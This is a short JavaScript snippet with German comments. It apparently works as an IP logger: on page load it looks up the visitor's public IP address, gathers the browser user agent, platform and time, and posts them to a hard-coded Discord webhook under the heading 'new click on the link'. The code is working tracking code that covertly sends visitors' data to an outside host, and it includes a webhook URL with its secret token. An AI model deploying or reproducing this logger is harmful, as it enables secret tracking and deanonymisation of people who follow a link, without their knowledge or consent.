// IP-Adresse holen
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";
    const browser = navigator.userAgent
    const platform = navigator.platform
    const zeitstempel = new Date().toLocaleString("de-DE");
    const payload = {
      content: `# 📨 NEUER KLICK AUF DEN LINK!\n**📌 IP-Addresse:** \`${ip}\`\n**🌏 Browsertyp:** ${browser}\n**📱 Gerätetyp:** ${platform}\n**⏰ Uhrzeit:** ${zeitstempel}\n**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
